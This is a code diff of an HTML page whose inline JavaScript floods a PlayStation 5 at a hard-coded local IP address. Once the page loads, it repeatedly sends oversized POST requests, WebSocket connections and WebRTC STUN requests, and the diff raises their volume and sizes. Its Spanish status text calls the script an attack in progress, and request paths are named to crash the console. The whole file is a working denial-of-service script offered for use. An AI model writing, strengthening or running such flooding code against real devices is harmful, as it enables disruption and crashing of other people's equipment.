@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS5 Ethernet Attack</title>
+    <title>PS5 Ethernet Bruteforce</title>
     <style>
         body {
-            background-color: #111;
+            background-color: #000;
             color: #0f0;
             font-family: monospace;
             padding: 20px;
@@ -12,49 +12,62 @@
     </style>
 </head>
 <body>
-    <h1>Ethernet Stress Test PS5</h1>
+    <h1>PS5 Ethernet Bruteforce Stress</h1>
     <div id="status">Preparando...</div>
 
     <script>
-        const PS5_IP = "192.168.137.200"; // la IP de tu PS5
+        const PS5_IP = "192.168.137.200"; // IP de la PS5
 
         function floodFetch() {
-            for (let i = 0; i < 500; i++) {
+            for (let i = 0; i < 1000; i++) {
                 try {
-                    fetch(`http://${PS5_IP}/nonexistent_path_${Math.random()}`, {
+                    fetch(`http://${PS5_IP}/crash_me_${Math.random()}`, {
                         method: 'POST',
                         headers: {
-                            'X-Test-Header': 'A'.repeat(10000),
-                            'X-Corrupt-Attempt': 'B'.repeat(20000),
+                            'X-Payload': 'A'.repeat(50000),
                         },
-                        body: 'C'.repeat(50000),
+                        body: 'B'.repeat(100000),
                         mode: 'no-cors',
                         cache: 'no-store',
                         keepalive: true,
                     }).catch(() => {});
-                } catch (e) {
-                    console.log(e);
-                }
+                } catch (e) {}
             }
         }
 
         function floodWebSocket() {
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 100; i++) {
                 try {
-                    new WebSocket(`ws://${PS5_IP}/ws_${Math.random()}`);
-                } catch (e) {
-                    console.log(e);
-                }
+                    let ws = new WebSocket(`ws://${PS5_IP}/crazy_socket_${Math.random()}`);
+                    ws.onerror = () => {}; // Ignorar errores
+                } catch (e) {}
             }
         }
 
-        function startTest() {
-            document.getElementById('status').textContent = "Ataque en curso contra " + PS5_IP;
-            setInterval(floodFetch, 500);
-            setInterval(floodWebSocket, 1500);
+        function floodWebRTC() {
+            for (let i = 0; i < 50; i++) {
+                try {
+                    let pc = new RTCPeerConnection({
+                        iceServers: [{ urls: `stun:${PS5_IP}:3478` }]
+                    });
+
+                    pc.createDataChannel("crash" + Math.random());
+                    pc.createOffer().then(offer => {
+                        return pc.setLocalDescription(offer);
+                    }).catch(() => {});
+                } catch (e) {}
+            }
         }
 
-        window.onload = startTest;
+        function startAttack() {
+            document.getElementById('status').textContent = "Ataque en curso contra " + PS5_IP;
+
+            setInterval(floodFetch, 300);
+            setInterval(floodWebSocket, 1000);
+            setInterval(floodWebRTC, 500);
+        }
+
+        window.onload = startAttack;
     </script>
 </body>
 </html>
